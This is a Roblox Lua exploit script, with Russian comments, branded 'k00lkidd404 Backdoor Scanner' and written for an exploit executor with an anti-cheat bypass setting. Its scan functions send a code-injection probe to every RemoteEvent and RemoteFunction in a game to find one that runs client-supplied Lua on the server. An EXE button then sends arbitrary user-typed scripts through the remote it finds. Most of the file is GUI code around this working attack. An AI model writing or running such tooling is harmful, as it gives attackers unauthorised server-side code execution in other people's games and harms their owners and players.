-- Настройки
local settings = {
    scanTimeout = 15,
    maxScanDepth = 500,
    antiCheatBypass = true,
    stealthMode = false,
    scanDelay = 0.2,
    fastScanMode = true
}

-- Цвета
local colors = {
    dark = Color3.fromRGB(20, 20, 25),
    darkRed = Color3.fromRGB(40, 0, 0),
    red = Color3.fromRGB(120, 0, 0),
    neonRed = Color3.fromRGB(255, 50, 50),
    white = Color3.fromRGB(255, 255, 255),
    black = Color3.fromRGB(0, 0, 0),
    green = Color3.fromRGB(95, 185, 47),
    blue = Color3.fromRGB(0, 150, 255),
    yellow = Color3.fromRGB(255, 255, 0),
    purple = Color3.fromRGB(150, 0, 150),
    orange = Color3.fromRGB(255, 165, 0)
}

-- Сервисы
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ServerScriptService = game:GetService("ServerScriptService")
local ServerStorage = game:GetService("ServerStorage")
local Lighting = game:GetService("Lighting")
local Stats = game:GetService("Stats")
local UserInputService = game:GetService("UserInputService")
local StarterGui = game:GetService("StarterGui")
local Workspace = game:GetService("Workspace")
local JointsService = game:GetService("JointsService")
local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")

-- Состояние
local state = {
    backdoor = nil,
    attached = false,
    scanning = false,
    minimized = false,
    remoteCodes = {},
    STRING_VALUE_NAME = tostring(math.random(1000000, 9999999))
}

-- Создание GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "BackdoorScanner"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
if gethui then ScreenGui.Parent = gethui() else ScreenGui.Parent = CoreGui end

-- Главное окно
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0.45, 0, 0.55, 0)
MainFrame.Position = UDim2.new(0.275, 0, 0.225, 0)
MainFrame.BackgroundColor3 = colors.dark
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.ClipsDescendants = true
MainFrame.Parent = ScreenGui

-- Неоновая обводка
local FrameGlow = Instance.new("Frame")
FrameGlow.Name = "FrameGlow"
FrameGlow.Size = UDim2.new(1, 4, 1, 4)
FrameGlow.Position = UDim2.new(0, -2, 0, -2)
FrameGlow.BackgroundColor3 = colors.neonRed
FrameGlow.BorderSizePixel = 0
FrameGlow.ZIndex = 0
FrameGlow.Parent = MainFrame

local InnerFrame = Instance.new("Frame")
InnerFrame.Size = UDim2.new(1, -2, 1, -2)
InnerFrame.Position = UDim2.new(0, 1, 0, 1)
InnerFrame.BackgroundColor3 = colors.dark
InnerFrame.BorderSizePixel = 0
InnerFrame.ZIndex = 1
InnerFrame.Parent = FrameGlow

-- Заголовок
local TitleBar = Instance.new("Frame")
TitleBar.Name = "TitleBar"
TitleBar.Size = UDim2.new(1, 0, 0.08, 0)
TitleBar.Position = UDim2.new(0, 0, 0, 0)
TitleBar.BackgroundColor3 = colors.darkRed
TitleBar.BorderSizePixel = 0
TitleBar.ZIndex = 2
TitleBar.Parent = InnerFrame

local Title = Instance.new("TextLabel")
Title.Name = "Title"
Title.Size = UDim2.new(0.9, 0, 1, 0)
Title.Position = UDim2.new(0.05, 0, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = "k00lkidd404 Backdoor Scanner"
Title.TextColor3 = colors.neonRed
Title.TextScaled = true
Title.Font = Enum.Font.GothamBold
Title.TextXAlignment = Enum.TextXAlignment.Center
Title.ZIndex = 3
Title.Parent = TitleBar

-- Кнопка закрытия
local CloseButton = Instance.new("TextButton")
CloseButton.Name = "CloseButton"
CloseButton.Size = UDim2.new(0.08, 0, 1, 0)
CloseButton.Position = UDim2.new(0.92, 0, 0, 0)
CloseButton.BackgroundColor3 = colors.darkRed
CloseButton.BorderSizePixel = 0
CloseButton.Text = "X"
CloseButton.TextColor3 = colors.neonRed
CloseButton.TextScaled = true
CloseButton.Font = Enum.Font.GothamBold
CloseButton.ZIndex = 3
CloseButton.Parent = TitleBar

-- Кнопка сворачивания
local MinimizeButton = Instance.new("TextButton")
MinimizeButton.Name = "MinimizeButton"
MinimizeButton.Size = UDim2.new(0.08, 0, 1, 0)
MinimizeButton.Position = UDim2.new(0.84, 0, 0, 0)
MinimizeButton.BackgroundColor3 = colors.darkRed
MinimizeButton.BorderSizePixel = 0
MinimizeButton.Text = "_"
MinimizeButton.TextColor3 = colors.neonRed
MinimizeButton.TextScaled = true
MinimizeButton.Font = Enum.Font.GothamBold
MinimizeButton.ZIndex = 3
MinimizeButton.Parent = TitleBar

-- Кнопка открытия
local OpenButton = Instance.new("TextButton")
OpenButton.Name = "OpenButton"
OpenButton.Size = UDim2.new(0, 60, 0, 60)
OpenButton.Position = UDim2.new(0, 20, 0, 20)
OpenButton.BackgroundColor3 = colors.red
OpenButton.BorderSizePixel = 3
OpenButton.BorderColor3 = colors.black
OpenButton.Text = "Scanner/Open"
OpenButton.TextColor3 = colors.black
OpenButton.TextScaled = true
OpenButton.Font = Enum.Font.GothamBold
OpenButton.Visible = false
OpenButton.ZIndex = 10
OpenButton.Parent = ScreenGui

-- Скругление кнопки
local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0.2, 0)
UICorner.Parent = OpenButton

-- Индикатор статуса
local StatusIndicator = Instance.new("Frame")
StatusIndicator.Name = "StatusIndicator"
StatusIndicator.Size = UDim2.new(0.025, 0, 0.025, 0)
StatusIndicator.Position = UDim2.new(0.965, 0, 0.965, 0)
StatusIndicator.BackgroundColor3 = colors.neonRed
StatusIndicator.BorderSizePixel = 0
StatusIndicator.ZIndex = 3
StatusIndicator.Parent = InnerFrame

local UICornerStatus = Instance.new("UICorner")
UICornerStatus.CornerRadius = UDim.new(1, 0)
UICornerStatus.Parent = StatusIndicator

-- Окно логов
local LogsFrame = Instance.new("Frame")
LogsFrame.Name = "LogsFrame"
LogsFrame.Size = UDim2.new(0.9, 0, 0.5, 0)
LogsFrame.Position = UDim2.new(0.05, 0, 0.25, 0)
LogsFrame.BackgroundColor3 = colors.dark
LogsFrame.BorderSizePixel = 0
LogsFrame.Visible = false
LogsFrame.ZIndex = 5
LogsFrame.Active = true
LogsFrame.Draggable = true
LogsFrame.Parent = ScreenGui

-- Заголовок логов
local LogsTitleBar = Instance.new("Frame")
LogsTitleBar.Name = "LogsTitleBar"
LogsTitleBar.Size = UDim2.new(1, 0, 0.1, 0)
LogsTitleBar.Position = UDim2.new(0, 0, 0, 0)
LogsTitleBar.BackgroundColor3 = colors.darkRed
LogsTitleBar.BorderSizePixel = 0
LogsTitleBar.ZIndex = 6
LogsTitleBar.Parent = LogsFrame

local LogsTitle = Instance.new("TextLabel")
LogsTitle.Size = UDim2.new(0.8, 0, 1, 0)
LogsTitle.Position = UDim2.new(0.1, 0, 0, 0)
LogsTitle.BackgroundTransparency = 1
LogsTitle.Text = "Logs:"
LogsTitle.TextColor3 = colors.neonRed
LogsTitle.TextXAlignment = Enum.TextXAlignment.Left
LogsTitle.ZIndex = 7
LogsTitle.Parent = LogsTitleBar

local LogsCloseButton = Instance.new("TextButton")
LogsCloseButton.Name = "LogsCloseButton"
LogsCloseButton.Size = UDim2.new(0.1, 0, 1, 0)
LogsCloseButton.Position = UDim2.new(0.9, 0, 0, 0)
LogsCloseButton.BackgroundColor3 = colors.darkRed
LogsCloseButton.BorderSizePixel = 0
LogsCloseButton.Text = "X"
LogsCloseButton.TextColor3 = colors.neonRed
LogsCloseButton.TextScaled = true
LogsCloseButton.Font = Enum.Font.GothamBold
LogsCloseButton.ZIndex = 7
LogsCloseButton.Parent = LogsTitleBar

local LogsScrolling = Instance.new("ScrollingFrame")
LogsScrolling.Size = UDim2.new(1, -10, 0.9, -10)
LogsScrolling.Position = UDim2.new(0, 5, 0.1, 5)
LogsScrolling.BackgroundTransparency = 1
LogsScrolling.BorderSizePixel = 0
LogsScrolling.ScrollBarThickness = 5
LogsScrolling.ZIndex = 6
LogsScrolling.Parent = LogsFrame

local LogsContent = Instance.new("TextLabel")
LogsContent.Size = UDim2.new(1, 0, 0, 0)
LogsContent.AutomaticSize = Enum.AutomaticSize.Y
LogsContent.Position = UDim2.new(0, 0, 0, 0)
LogsContent.BackgroundTransparency = 1
LogsContent.Text = ""
LogsContent.TextColor3 = colors.white
LogsContent.TextXAlignment = Enum.TextXAlignment.Left
LogsContent.TextYAlignment = Enum.TextYAlignment.Top
LogsContent.ZIndex = 6
LogsContent.Parent = LogsScrolling

-- Поле ввода скрипта
local ScriptBox = Instance.new("ScrollingFrame")
ScriptBox.Name = "ScriptBox"
ScriptBox.Size = UDim2.new(0.94, 0, 0.65, 0)
ScriptBox.Position = UDim2.new(0.03, 0, 0.12, 0)
ScriptBox.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
ScriptBox.BackgroundTransparency = 0.7
ScriptBox.BorderSizePixel = 0
ScriptBox.ScrollBarThickness = 5
ScriptBox.ZIndex = 2
ScriptBox.Visible = false
ScriptBox.Parent = InnerFrame

local ScriptInput = Instance.new("TextBox")
ScriptInput.Name = "ScriptInput"
ScriptInput.Size = UDim2.new(1, -10, 1, -10)
ScriptInput.Position = UDim2.new(0, 5, 0, 5)
ScriptInput.BackgroundTransparency = 1
ScriptInput.TextColor3 = colors.white
ScriptInput.Text = ""
ScriptInput.PlaceholderText = "Введите скрипт здесь"
ScriptInput.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
ScriptInput.TextXAlignment = Enum.TextXAlignment.Left
ScriptInput.TextYAlignment = Enum.TextYAlignment.Top
ScriptInput.TextWrapped = true
ScriptInput.Font = Enum.Font.Code
ScriptInput.TextSize = 16
ScriptInput.ClearTextOnFocus = false
ScriptInput.MultiLine = true
ScriptInput.ZIndex = 3
ScriptInput.Parent = ScriptBox

-- Основная кнопка Scan
local ScanButton = Instance.new("TextButton")
ScanButton.Name = "ScanButton"
ScanButton.Size = UDim2.new(0.8, 0, 0.7, 0)
ScanButton.Position = UDim2.new(0.1, 0, 0.15, 0)
ScanButton.BackgroundColor3 = colors.red
ScanButton.BorderSizePixel = 0
ScanButton.Text = "SCAN"
ScanButton.TextColor3 = colors.black
ScanButton.TextScaled = true
ScanButton.Font = Enum.Font.GothamBold
ScanButton.ZIndex = 2
ScanButton.Parent = InnerFrame

local ScanButtonCorner = Instance.new("UICorner")
ScanButtonCorner.CornerRadius = UDim.new(0.1, 0)
ScanButtonCorner.Parent = ScanButton

-- Кнопка EXE
local ExecuteButton = Instance.new("TextButton")
ExecuteButton.Name = "ExecuteButton"
ExecuteButton.Size = UDim2.new(0.8, 0, 0.15, 0)
ExecuteButton.Position = UDim2.new(0.1, 0, 0.79, 0)
ExecuteButton.BackgroundColor3 = colors.red
ExecuteButton.BorderSizePixel = 0
ExecuteButton.Text = "EXE"
ExecuteButton.TextColor3 = colors.black
ExecuteButton.TextScaled = true
ExecuteButton.Font = Enum.Font.GothamBold
ExecuteButton.Visible = false
ExecuteButton.ZIndex = 2
ExecuteButton.Parent = InnerFrame

local ExecuteButtonCorner = Instance.new("UICorner")
ExecuteButtonCorner.CornerRadius = UDim.new(0.1, 0)
ExecuteButtonCorner.Parent = ExecuteButton

-- Кнопка Logs
local LogsButton = Instance.new("TextButton")
LogsButton.Name = "LogsButton"
LogsButton.Size = UDim2.new(0.3, 0, 0.15, 0)
LogsButton.Position = UDim2.new(0.35, 0, 0.85, 0)
LogsButton.BackgroundColor3 = colors.darkRed
LogsButton.BorderSizePixel = 0
LogsButton.Text = "Logs"
LogsButton.TextColor3 = colors.neonRed
LogsButton.TextScaled = true
LogsButton.Font = Enum.Font.GothamBold
LogsButton.ZIndex = 2
LogsButton.Parent = InnerFrame

local LogsButtonCorner = Instance.new("UICorner")
LogsButtonCorner.CornerRadius = UDim.new(0.1, 0)
LogsButtonCorner.Parent = LogsButton

-- Функция для добавления логов
local function AddLog(text)
    LogsContent.Text = LogsContent.Text .. "\n" .. text
    LogsScrolling.CanvasSize = UDim2.new(0, 0, 0, LogsContent.TextBounds.Y + 10)
    LogsScrolling.CanvasPosition = Vector2.new(0, LogsScrolling.CanvasSize.Y.Offset)
end

-- Функция показа сообщения
local function ShowMessage(text, color)
    local message = Instance.new("TextLabel")
    message.Name = "StatusMessage"
    message.Size = UDim2.new(0.3, 0, 0.05, 0)
    message.Position = UDim2.new(0.7, 0, 0.93, 0)
    message.BackgroundTransparency = 1
    message.Text = text
    message.TextColor3 = color
    message.TextScaled = true
    message.Font = Enum.Font.GothamBold
    message.ZIndex = 10
    message.Parent = ScreenGui
    spawn(function()
        wait(3)
        for i = 1, 10 do
            message.TextTransparency = i/10
            wait(0.05)
        end
        message:Destroy()
    end)
end

-- Точная копия функции validRemote из вашего бэкдора
local function validRemote(rm)
    local Parent = rm.Parent
    local class = rm.ClassName
    if class ~= "RemoteEvent" and class ~= "RemoteFunction" then return false end

    if Parent then
        if Parent == JointsService then return false end
        if (Parent == ReplicatedStorage and rm:FindFirstChild("__FUNCTION")) or
        (rm.Name == "__FUNCTION" and Parent.ClassName == "RemoteEvent" and Parent.Parent == ReplicatedStorage) then return false end
    end

    if rm:IsDescendantOf(RobloxReplicatedStorage) then return false end

    return true
end

-- Обновленная функция scanDescendants на основе предоставленного кода
local function scanDescendants(parent)
    local descendance = parent:GetDescendants()
    for i = 1, #descendance do
        local descendant = descendance[i]

        if not validRemote(descendant) then continue end
        
        -- Генерируем уникальный код для этого ремота
        local remoteCode = tostring(math.random(100000, 999999))
        state.remoteCodes[remoteCode] = descendant
        
        local remoteClass = descendant.ClassName
        local requireScript = ("i=Instance.new('StringValue', game.Workspace); i.Name='%s'; i.Value='%s'"):format(state.STRING_VALUE_NAME, remoteCode)

        if remoteClass == "RemoteEvent" then
            descendant:FireServer(requireScript)
        elseif remoteClass == "RemoteFunction" then
            local waiting = true
            spawn(function()
                descendant:InvokeServer(requireScript)
                waiting = nil
            end)

            -- Если RemoteFunction не отвечает в течение 1 секунды, пропускаем его
            local start = tick()
            while waiting and (tick() - start) < 1 do
                wait()
            end
        end

        if Workspace:FindFirstChild(state.STRING_VALUE_NAME) then
            state.attached = true
            state.backdoor = state.remoteCodes[Workspace:FindFirstChild(state.STRING_VALUE_NAME).Value]
            state.backdoor:FireServer(("game.Workspace['%s']:Destroy()"):format(state.STRING_VALUE_NAME)) -- Очистка
            
            return true
        end
    end
end

-- Обновленная функция Scan на основе предоставленного кода
local function Scan()
    if state.scanning then return end
    state.scanning = true
    state.attached = false
    
    AddLog("-- Starting backdoor scan...")
    
    local found = false
    local backdoorLocation = nil
    
    -- Сначала сканируем common места
    local commonPlaces = {
        ReplicatedStorage,
        Workspace,
        Lighting
    }
    
    for i = 1, #commonPlaces do
        local place = commonPlaces[i]
        if scanDescendants(place) then
            found = true
            backdoorLocation = place:GetFullName()
            break
        end
    end
    
    -- Если не нашли, сканируем весь game
    if not found then
        local children = game:GetChildren()
        for i = 1, #children do
            local child = children[i]
            -- Пропускаем уже проверенные common места
            if table.find(commonPlaces, child) then continue end
            
            if scanDescendants(child) then 
                found = true
                backdoorLocation = child:GetFullName()
                break
            end
        end
    end
    
    if found then
        StatusIndicator.BackgroundColor3 = colors.green
        ShowMessage("Backdoor Found!", colors.green)
        AddLog("-- Backdoor found at: "..backdoorLocation)
        AddLog("-- Backdoor object: "..state.backdoor:GetFullName())
        
        -- Проигрываем звук при нахождении бэкдора
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://106797007593707"
        sound.Parent = workspace
        sound:Play()
        game:GetService("Debris"):AddItem(sound, 5)
        
        -- Показываем поле ввода и кнопку EXE, перемещаем кнопку Logs
        ScanButton.Visible = false
        ScriptBox.Visible = true
        ExecuteButton.Visible = true
        LogsButton.Position = UDim2.new(0.35, 0, 0.9, 0) -- Новое положение кнопки Logs
    else
        StatusIndicator.BackgroundColor3 = colors.neonRed
        ShowMessage("No backdoors found!", colors.neonRed)
        AddLog("-- No backdoors found!")
        -- Возвращаем кнопку Logs на место если бэкдор не найден
        LogsButton.Position = UDim2.new(0.35, 0, 0.85, 0)
    end
    
    state.scanning = false
    return found
end

-- Функция выполнения скрипта (адаптированная из вашего бэкдора)
local function ExecuteScript()
    local scriptToExecute = ScriptInput.Text
    if scriptToExecute == "" then
        AddLog("-- ERROR: Script is empty!")
        ShowMessage("Script is empty!", colors.neonRed)
        return
    end
    
    if not state.attached then
        local function callback(text)
            if text == "Yes" then
                if Scan() then
                    ExecuteScript()
                end
            elseif text == "No" then
                return
            end
        end
        
        local bf = Instance.new("BindableFunction")
        bf.OnInvoke = callback
        game:GetService("StarterGui"):SetCore("SendNotification",{
            Title = "Backdoor Scanner",
            Text = "You're not attached.\nWould you like to attach now?",
            Icon = "",
            Duration = 5,
            Button1 = "Yes",
            Button2 = "No",
            Callback = bf
        })
        return
    end
    
    if not state.backdoor then
        AddLog("-- ERROR: No backdoor found!")
        ShowMessage("No backdoor!", colors.neonRed)
        return
    end
    
    AddLog("-- Executing script via backdoor...")
    local success, result = pcall(function()
        if state.backdoor.ClassName == "RemoteEvent" then
            state.backdoor:FireServer(scriptToExecute)
        elseif state.backdoor.ClassName == "RemoteFunction" then
            state.backdoor:InvokeServer(scriptToExecute)
        end
    end)
    
    if success then
        AddLog("-- Script executed successfully via backdoor")
        ShowMessage("Execution success!", colors.green)
    else
        AddLog("-- Execution failed: "..tostring(result))
        ShowMessage("Execution failed!", colors.neonRed)
    end
end

-- Обработчики кнопок
ScanButton.MouseButton1Click:Connect(function()
    if not state.scanning then
        Scan()
    else
        AddLog("-- Scan already in progress!")
        ShowMessage("Scan in progress!", colors.neonRed)
    end
end)

ExecuteButton.MouseButton1Click:Connect(ExecuteScript)

LogsButton.MouseButton1Click:Connect(function()
    LogsFrame.Visible = not LogsFrame.Visible
    if LogsFrame.Visible then
        ShowMessage("Logs shown!", colors.green)
    else
        ShowMessage("Logs hidden!", colors.neonRed)
    end
end)

LogsCloseButton.MouseButton1Click:Connect(function()
    LogsFrame.Visible = false
    ShowMessage("Logs closed!", colors.neonRed)
end)

CloseButton.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)

MinimizeButton.MouseButton1Click:Connect(function()
    MainFrame.Visible = false
    OpenButton.Visible = true
    state.minimized = true
    ShowMessage("Minimized!", colors.neonRed)
end)

OpenButton.MouseButton1Click:Connect(function()
    OpenButton.Visible = false
    MainFrame.Visible = true
    state.minimized = false
    ShowMessage("Restored!", colors.green)
end)

-- Анимация кнопок
local function animateButton(button)
    local originalSize = button.Size
    local originalPos = button.Position
    
    button.MouseEnter:Connect(function()
        TweenService:Create(
            button,
            TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            {Size = originalSize + UDim2.new(0.02, 0, 0.02, 0)}
        ):Play()
    end)
    
    button.MouseLeave:Connect(function()
        TweenService:Create(
            button,
            TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            {Size = originalSize}
        ):Play()
    end)
end

-- Применяем анимацию к кнопкам
animateButton(ScanButton)
animateButton(ExecuteButton)
animateButton(LogsButton)

-- Добавляем GUI игроку
if Players.LocalPlayer then
    ScreenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
    AddLog("-- k00lkidd404 Backdoor Scanner loaded!")
    AddLog("-- Ready for scanning")
else
    Players.PlayerAdded:Connect(function(player)
        player:WaitForChild("PlayerGui")
        ScreenGui.Parent = player:WaitForChild("PlayerGui")
        AddLog("-- k00lkidd404 Backdoor Scanner loaded!")
        AddLog("-- Ready for scanning")
    end)
end